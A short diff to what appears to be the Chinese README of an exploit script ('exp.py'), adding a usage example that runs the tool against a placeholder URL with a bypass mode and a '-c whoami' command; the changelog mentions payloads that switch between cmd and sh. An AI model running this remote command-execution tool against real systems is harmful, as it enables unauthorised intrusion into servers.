@@ -27,3 +27,8 @@ python exp.py -u http://x.x.x.x/squirt1e/ -b bypass1 -m detect
 2. 增加了 -c 参数，可以指定命令行
 3. payload中增加了自动检测系统环境的功能，自动切换cmd和sh
 4. 解决SSL问题
+
+
+```
+python exp.py -u http://x.x.x.x/ -b bypass1 -m detect -c whoami
+```
